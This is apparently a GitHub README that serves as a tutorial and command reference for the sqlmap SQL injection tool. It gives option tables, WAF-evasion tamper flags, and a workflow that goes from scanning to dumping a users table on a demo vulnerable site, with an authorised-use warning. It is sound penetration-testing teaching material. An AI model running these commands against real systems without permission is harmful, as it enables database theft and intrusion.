<img width="1078" height="459" alt="image" src="https://github.com/user-attachments/assets/e04618c9-581c-44fb-b3b3-f853b3162148" />

# 🛡️ SQLMAP: A Comprehensive Guide & Command Reference

[![License](https://img.shields.io/badge/license-GPLv2-blue.svg)](https://github.com/sqlmapproject/sqlmap/blob/master/LICENSE)

**SQLMAP** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws, making it an essential tool for security professionals and ethical hackers. This repository serves as an in-depth guide and command reference for SQLMAP, from foundational concepts to advanced exploitation techniques.

## 🧪 Practice Labs & Methodology

This repository includes hands-on exercises from various training platforms to help you apply SQLMAP in real-world scenarios.

### 🛒 E-commerce & Custom Web Applications

- [**ShopVulne Website Testing**](ShopVulne.md) – Authentication bypass and vulnerability assessment on a mock e-commerce platform.

### 🎯 OWASP Juice Shop

- [**OWASP Juice Shop Exploitation**](OWASP%20Juice%20Shop.md) – Comprehensive walkthrough for one of the most widely used modern vulnerable web applications.

### 🏦 The AltoroJ Website

- [**The AltoroJ Website Testing**](The%20AltoroJ%20website.md) – Financial services application security assessment.

### 🔐 PortSwigger Web Security Academy

- [**PortSwigger Login Bypass**](PortSwigger%20Login%20Bypass.md) – SQL injection challenges focused on login mechanism bypasses.
---


## 🔑 Key Concepts

Before diving into the commands, it's crucial to understand SQLMAP's terminology and the different SQL injection techniques it uses. The tool supports six main techniques, which you can read about [here](https://github.com/sqlmapproject/sqlmap/wiki/Techniques).

- **B**oolean-based blind
- **E**rror-based
- **U**NION query
- **S**tacked queries
- **T**ime-based blind
- **Q**uery (inline queries)

Understanding these techniques is important for interpreting SQLMAP's output and understanding *how* a vulnerability is being exploited.

---

## 🚀 Getting Started

### Basic Usage

The simplest way to check a URL for vulnerabilities:

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

### Checking All Options

To see a full list of all available options:

```bash
sqlmap -hh
```

---

## 📝 Detailed Command Reference

Here is a detailed breakdown of essential SQLMAP options.

### 1. Target & Request Options

| Option | Description | Example |
| :--- | :--- | :--- |
| `-u URL, --url=URL` | Target URL (GET parameters) | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1"` |
| `-r REQUESTFILE` | Load HTTP request from a file (e.g., Burp Suite capture) | `sqlmap -r request.txt` |
| `-l LOGFILE` | Parse target(s) from Burp or WebScarab proxy log file | `sqlmap -l burp.log` |
| `--method=METHOD` | Force usage of given HTTP method (e.g., PUT) | `sqlmap -u "http://example.com" --method=PUT` |
| `--random-agent` | Use a randomly selected HTTP `User-Agent` header value | `sqlmap -u "http://example.com/page.php?id=1" --random-agent` |

### 2. Enumeration Options

| Option | Description | Example |
| :--- | :--- | :--- |
| `--dbs` | Enumerate all databases | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" --dbs` |
| `--current-db` | Retrieve the current database name | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" --current-db` |
| `--tables` | Enumerate tables in a specific database (must be used with `-D`) | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart --tables` |
| `--columns` | Enumerate columns in a specific table (use with `-D` and `-T`) | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart -T users --columns` |
| `--dump` | Dump the data from a table (use with `-D` and `-T`) | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart -T users --dump` |
| `--users` | Enumerate database users | `sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" --users` |

### 3. Injection & Detection Options

| Option | Description | Example |
| :--- | :--- | :--- |
| `--level=LEVEL` | Level of tests to perform (1-5, default 1). **Level 1**: Tests only GET and POST parameters. **Level 3**: Also tests HTTP headers like `User-Agent` and `Referer`. | `sqlmap -u "http://example.com/page.php?id=1" --level=3` |
| `--risk=RISK` | Risk of tests to perform (1-3, default 1). **Risk 1**: Safe. **Risk 3**: Highly aggressive and may alter data. | `sqlmap -u "http://example.com/page.php?id=1" --level=3 --risk=2` |
| `--technique=TECH` | Specify which injection techniques to use (default: `BEUSTQ`). | `sqlmap -u "http://example.com/page.php?id=1" --technique=T` (Only time-based blind) |
| `--dbms=DBMS` | Force the back-end DBMS to a specific value (e.g., `mysql`, `mssql`). | `sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql` |
| `--no-cast` | Turn off the payload casting mechanism, used for troubleshooting type conversion issues. | `sqlmap -u "http://example.com/page.php?id=1" --no-cast` |

### 4. Bypass & Evasion Options

| Option | Description | Example |
| :--- | :--- | :--- |
| `--tamper=TAMPER` | Use a script (or scripts) to tamper with payload data to evade WAFs/IDS. | `sqlmap -u "http://example.com/page.php?id=1" --tamper=between,space2comment` |
| `--ignore-code=CODE` | Ignore specific HTTP error codes (e.g., `401` for unauthorized). | `sqlmap -u "http://example.com/page.php?id=1" --ignore-code=401` |

### 5. Advanced & Optimization Options

| Option | Description | Example |
| :--- | :--- | :--- |
| `-v VERBOSE` | Verbosity level (0-6, default 1). **Level 3**: Shows injected payloads. **Level 4**: Shows HTTP requests and responses. | `sqlmap -u "http://example.com/page.php?id=1" -v 3` |
| `--batch` | Never ask for user input; use the default behavior. | `sqlmap -u "http://example.com/page.php?id=1" --batch` |

---

## 🔬 Practical Workflow: Enumeration to Exfiltration

This workflow demonstrates how to chain the options above to perform a complete security assessment.

**1. Initial Vulnerability Scan:**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" --batch --level=3
   ```
   This command uses `--batch` to skip interactive prompts and `--level=3` to also test HTTP headers, providing a more thorough initial scan.

**2. Enumerate Databases:**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" --dbs
   ```
   Once a vulnerability is confirmed, this command lists all accessible databases.

**3. Enumerate Tables (from a specific database):**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart --tables
   ```
   Here, `-D acuart` specifies the target database to enumerate its tables.

**4. Enumerate Columns (from a specific table):**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart -T users --columns
   ```
   The `-T users` flag isolates a single table, and `--columns` lists its column names, revealing the data structure.

**5. Dump Table Data:**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?id=1" -D acuart -T users --dump
   ```
   This final step retrieves the actual data from the `users` table.

---

## ⚠️ Important Considerations & Best Practices

- **Legal and Ethical Use**: Only use SQLMAP on systems you own or have explicit written permission to test. Unauthorized access is illegal and unethical.
- **Start with Defaults, Then Aggress**: Begin with the default `--level` and `--risk` to avoid accidental data modification or denial-of-service. Gradually increase these settings only if deeper scanning is needed.
- **Detection Evasion**: If a WAF or IDS is blocking your tests, `--tamper` is your most powerful tool. Use scripts like `between` to rewrite SQL operators and evade simple filters.
- **Performance Optimization**: For large targets, use `--threads` to speed up the process. However, be cautious with high thread counts, as they can overwhelm the target server and cause instability.
- **Parse Errors**: Use `--parse-errors` to display DBMS error messages, which can provide valuable insight into the underlying database system and its configuration.

## 🔗 References & Further Reading

- [Official SQLMAP Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
